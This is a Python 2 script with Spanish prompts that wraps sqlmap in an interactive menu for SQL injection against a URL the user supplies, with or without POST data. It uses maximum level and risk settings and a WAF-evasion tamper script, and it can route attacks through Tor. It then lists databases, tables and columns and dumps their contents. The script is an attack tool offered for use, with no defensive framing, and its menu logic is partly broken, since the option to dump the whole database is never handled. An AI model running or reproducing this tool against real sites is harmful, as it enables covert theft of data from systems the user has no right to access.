#!/usr/bin/python2
# encoding: utf-8
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

import subprocess
def sqlinorm():
    global url
    url=raw_input("introduce la url vulnerable a sqli: ")
    if url != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"--dbs"])
        postsqli()
    else:
        sqlinorm()
def sqlitor():
    global url
    url=raw_input("introduce la url vulnerable a sqli: ")
    if url != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level=5","--risk=3","-u",url,"--dbs"])
        postsqli()
    else:
        sqlitor()

def sqlipost():
    global url
    url=raw_input("introduce la url vulnerable a sqli: ")
    global post
    post=raw_input("introduce los datos post para la inyeccion sqli: ")
    if url != "" and post != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"--data",post,"--dbs"])
        postsqli()
    else:
        sqlipost()

def sqlipostor():
    global url
    url=raw_input("introduce la url vulnerable a sqli: ")
    global post
    post=raw_input("introduce los datos post para la inyeccion sqli: ")
    if url != "" and post != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level=5","--risk=3","-u",url,"--data",post,"--dbs"])
        postsqli()
    else:
        sqlipostor()
def postdb():
    db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
    if db != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"-D",db,"--tables"])
    else:
        postdb()
def posttables():
    db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
    table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
    if db != "" and table != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"-D",db,"-T",table,"--columns"])
    else:
        posttables()
def postcolumns():
    db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
    table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
    columns=raw_input("Introduce el nombre de la columna que quieres extraer los datos, o columnas separadas por coma si son varias: ")
    if db != "" and table != "" and columns != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"-D",db,"-T",table,"-C",columns,"--dump"])
    else:
        postcolumns()

def postsqli():
    print """ Elige lo que quieres hacer:
        a) Extraer todas las tablas de una base de datos.
        b) Extraer todas las columnas de una tabla.
        c) Extraer todo de una o mas columnas.
        d) Dumpear toda la DataBase.
        e) Salir.
        """
    sel=raw_input("Teclea tu opcion: ")
    while sel != "e":
        if sel == "e":
            break
        elif sel == "a":
            postdb()
            postsqli()
        elif sel == "b":
            posttables()
            postsqli()
        elif sel == "c":
            postcolumns()
            postsqli()
        else:
            postsqli()

def execute():
    print"""Selecciona tu opcion:
    a) Sqli usando sqlmap sin proxy.
    b) Sqli usando sqlmap con TOR.
    c) Sqli usando post inyeccion.
    d) Sqli usando post inyeccion con TOR.
    """
    selec=raw_input("Teclea tu opcion: ")
    if selec == "a":
        sqlinorm()
    elif selec == "b":
        sqlitor()
    elif selec == "c":
        sqlipost()
    elif selec == "d":
        sqlipostor()
    else:
        execute()
    
